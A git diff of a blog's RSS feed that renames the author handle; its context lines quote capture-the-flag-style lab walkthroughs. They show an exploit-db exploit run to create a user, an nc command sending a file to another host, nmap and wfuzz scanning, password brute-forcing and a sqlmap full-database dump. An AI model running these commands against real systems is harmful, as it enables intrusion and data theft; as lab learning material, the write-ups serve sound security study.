@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Imipious notes</title>
+    <title>estafermo notes</title>
     <description></description>
     <link>http://yourdomain.com/</link>
     <atom:link href="http://yourdomain.com/feed.xml" rel="self" type="application/rss+xml"/>
@@ -218,7 +218,7 @@ ID	Response   Lines      Word         Chars          Request
 &lt;p&gt;Found the exploit ... a pre-authentication one, wow. o.o !!
 &lt;a href=&quot;https://www.exploit-db.com/exploits/34992/&quot;&gt;the exploit&lt;/a&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python 34992.py  -t http://192.168.1.88 -u impious -p impious&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python 34992.py  -t http://192.168.1.88 -u estafermo -p estafermo&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;User created.
 
@@ -280,12 +280,12 @@ nc 192.168.1.73 12345 &amp;lt; dave.tc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -p- -sV 192.168.1.84&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Running apache on port 80, running ssh on port 777. There are other two services that i ignored.
-&lt;p&gt;So, i open browser and found a pretty much unuseful page e h... i tried to search for other directories/pages on the server so i used wfuzz.py and also made lame attempt to replace wfuzz.py. Just because. This lame attempt is visible in &lt;a href=&quot;https://github.com/impious/trash&quot;&gt;github&lt;/a&gt; as hfuzz.rb.
+&lt;p&gt;So, i open browser and found a pretty much unuseful page e h... i tried to search for other directories/pages on the server so i used wfuzz.py and also made lame attempt to replace wfuzz.py. Just because. This lame attempt is visible in &lt;a href=&quot;https://github.com/estafermo/trash&quot;&gt;github&lt;/a&gt; as hfuzz.rb.
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404 -o html  http://192.168.1.84/FUZZ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt; A few directories but the most import was &lt;b&gt;phpmyadmin&lt;/b&gt;. There must be something more than a simple html with an image. Neverless i couldn&#39;t find anything useful, so i took a glimpse at the &lt;a href=&quot;http://anthonyferrillo.net/blog/nullbyte-solution/&quot;&gt;walkthrough&lt;/a&gt; and saw that people checked the image.
-&lt;p&gt;By now i already knew that there was an url on the image, shamefully i know, but &#39;live and learn&#39;. Went through an opened it in the browser and saw that the newly found page had a form and message saying the password wasn&#39;t hard. Again, i build an brute forcer to found the password. You can check the code &lt;a href=&quot;https://github.com/impious/trash&quot;&gt;github&lt;/a&gt; as brute.rb. After a few minutes i found the password &#39;elite&#39;. Btw, for real brute forcing use hydra.
+&lt;p&gt;By now i already knew that there was an url on the image, shamefully i know, but &#39;live and learn&#39;. Went through an opened it in the browser and saw that the newly found page had a form and message saying the password wasn&#39;t hard. Again, i build an brute forcer to found the password. You can check the code &lt;a href=&quot;https://github.com/estafermo/trash&quot;&gt;github&lt;/a&gt; as brute.rb. After a few minutes i found the password &#39;elite&#39;. Btw, for real brute forcing use hydra.
 &lt;p&gt;Anyway, a new form was found with a texbox on it. After playing around in the browser i found http://192.168.1.84/kzMb5nVYJw/420search.php which had a few data on it . That search smelled as sqli so i fired up sqlmap.py. Yes dump-all. No big databases on this playing vm&#39;s.
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sqlmap -u http://192.168.1.84/kzMb5nVYJw/420search.php?usrtosearch&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ramses --dump-all&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
